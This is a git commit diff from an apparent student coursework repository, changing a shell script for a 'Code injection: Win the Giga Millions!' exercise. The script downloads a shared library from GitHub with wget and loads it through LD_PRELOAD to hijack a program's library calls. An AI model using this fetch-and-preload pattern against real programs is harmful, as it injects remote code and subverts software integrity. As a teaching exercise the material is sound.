d5c563435352cdd8ef2d0f5b0581a82dccc22686
root <sylyac2000@gmail.com>
2022-06-13 20:19:08 -0700

    3. Code injection: Win the Giga Millions! other fix

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P ../ https://github.com/Sylyac2000/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libwin.so
-export LD_PRELOAD=../libwin.so
+wget -P ../ https://github.com/Sylyac2000/alx-low_level_programming/raw/master/0x18-dynamic_libraries/putshack.so
+export LD_PRELOAD=../putshack.so
